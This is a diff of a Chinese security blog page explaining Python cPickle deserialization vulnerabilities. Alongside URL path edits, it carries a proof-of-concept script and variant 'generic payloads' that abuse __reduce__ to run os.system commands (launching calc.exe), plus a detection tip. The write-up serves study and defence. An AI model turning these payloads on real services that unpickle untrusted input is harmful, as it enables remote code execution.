@@ -10,20 +10,20 @@
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Python cPickle反序列化漏洞">
-<meta property="og:url" content="https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/index.html">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/index.html">
 <meta property="og:site_name" content="Mi1k7ea">
 <meta property="og:description" content="基本概念Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。 cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数： c">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/1.jpg">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/2.jpg">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/3.jpg">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/4.jpg">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/5.jpg">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/1.jpg">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/2.jpg">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/3.jpg">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/4.jpg">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/5.jpg">
 <meta property="og:updated_time" content="2019-02-24T04:21:22.025Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Python cPickle反序列化漏洞">
 <meta name="twitter:description" content="基本概念Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。 cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数： c">
-<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/1.jpg">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/1.jpg">
     
     
         
@@ -85,10 +85,8 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" href="/2019/01/01/（Java）XMLDecoder反序列化漏洞/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" href="/2019/01/01/HITB_Binary_100_writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
-        
-        <li><a class="icon" href="/2019/01/01/phar反序列化漏洞/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -101,16 +99,16 @@
     <br>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&text=Python cPickle反序列化漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&is_video=false&description=Python cPickle反序列化漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Python cPickle反序列化漏洞&body=Check out this article: https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&name=Python cPickle反序列化漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&text=Python cPickle反序列化漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&is_video=false&description=Python cPickle反序列化漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Python cPickle反序列化漏洞&body=Check out this article: https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&name=Python cPickle反序列化漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -176,18 +174,18 @@
 <p>cPickle.loads()：将字符串反序列化为Python对象。</p>
 <p>简单示例：</p>
 <p>先创建Person类对象并初始化，然后将其序列化并输出，可以看到是C解释过的内容：</p>
-<p><img src="/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/1.jpg" alt=""></p>
+<p><img src="/2019/01/01/cPickle反序列化漏洞/1.jpg" alt=""></p>
 <p>为了方便，直接在该代码下面添加反序列化操作：</p>
-<p><img src="/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/2.jpg" alt=""></p>
+<p><img src="/2019/01/01/cPickle反序列化漏洞/2.jpg" alt=""></p>
 <h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>还是用上面的示例，添加一个__reduce__()魔术方法：</p>
-<p><img src="/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/3.jpg" alt=""></p>
+<p><img src="/2019/01/01/cPickle反序列化漏洞/3.jpg" alt=""></p>
 <h2 id="漏洞根源分析"><a href="#漏洞根源分析" class="headerlink" title="漏洞根源分析"></a>漏洞根源分析</h2><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。</p>
 <p>简单说明一下__reduce__()函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p>
 <p>由于cPickle是C写的代码且pickle与其实现原理一致，所以到$PYTHON_HOME/Lib/pickle.py中查看reduce加载的源码：</p>
-<p><img src="/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/4.jpg" alt=""></p>
+<p><img src="/2019/01/01/cPickle反序列化漏洞/4.jpg" alt=""></p>
 <p>通过调试可以发现，第1136行将当前栈内容赋值给stack变量，当前栈内容包含我们输入的恶意的os.system(“calc.txt”)内容，接着出栈赋值给args变量；通常函数返回地址都保存在当前EBP寄存器所指的上方，因此通过stack[-1]可以获取返回函数地址并赋值给func变量；最后调用func(*args)传入特定参数执行函数，从而完成对象的调用解析而执行任意命令。</p>
 <h2 id="通用payload"><a href="#通用payload" class="headerlink" title="通用payload"></a>通用payload</h2><p>因为反序列化之后用到的库需要在反序列化的文件中存在，所以这里简单分为未导入和导入目标模块即这里为os模块的情况，当然除此之外还有其他一些系统执行库、其他的姿势等等，可自行补充，后面有空再补上吧：</p>
-<p><img src="/2019/01/01/（Python）cPickle反序列化漏洞/cPickle反序列化漏洞/5.jpg" alt=""></p>
+<p><img src="/2019/01/01/cPickle反序列化漏洞/5.jpg" alt=""></p>
 <p>这里贴上测试代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,username,password)</span>:</span></span><br><span class="line">        self.username = username </span><br><span class="line">        self.password = password </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    	<span class="comment"># 未导入os模块，通用</span></span><br><span class="line">    	<span class="keyword">return</span> (__import__(<span class="string">'os'</span>).system, (<span class="string">'calc.exe'</span>,))</span><br><span class="line">    	<span class="comment"># return eval,("__import__('os').system('calc.exe')",)</span></span><br><span class="line">    	<span class="comment"># return map, (__import__('os').system, ('calc.exe',))</span></span><br><span class="line">    	<span class="comment"># return map, (__import__('os').system, ['calc.exe'])</span></span><br><span class="line"></span><br><span class="line">    	<span class="comment"># 导入os模块</span></span><br><span class="line">        <span class="comment"># return (os.system, ('calc.exe',))</span></span><br><span class="line">        <span class="comment"># return eval, ("os.system('calc.exe')",)</span></span><br><span class="line">        <span class="comment"># return map, (os.system, ('calc.exe',))</span></span><br><span class="line">        <span class="comment"># return map, (os.system, ['calc.exe'])</span></span><br><span class="line"></span><br><span class="line">admin = Person(<span class="string">'admin'</span>,<span class="string">'123456'</span>)</span><br><span class="line">result = cPickle.dumps(admin)</span><br><span class="line"></span><br><span class="line">user = cPickle.loads(result)</span><br></pre></td></tr></table></figure>
 <h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</p>
@@ -243,16 +241,16 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&text=Python cPickle反序列化漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&is_video=false&description=Python cPickle反序列化漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Python cPickle反序列化漏洞&body=Check out this article: https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/01/01/（Python）cPickle反序列化漏洞/&name=Python cPickle反序列化漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&text=Python cPickle反序列化漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&is_video=false&description=Python cPickle反序列化漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Python cPickle反序列化漏洞&body=Check out this article: https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&title=Python cPickle反序列化漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/01/01/cPickle反序列化漏洞/&name=Python cPickle反序列化漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
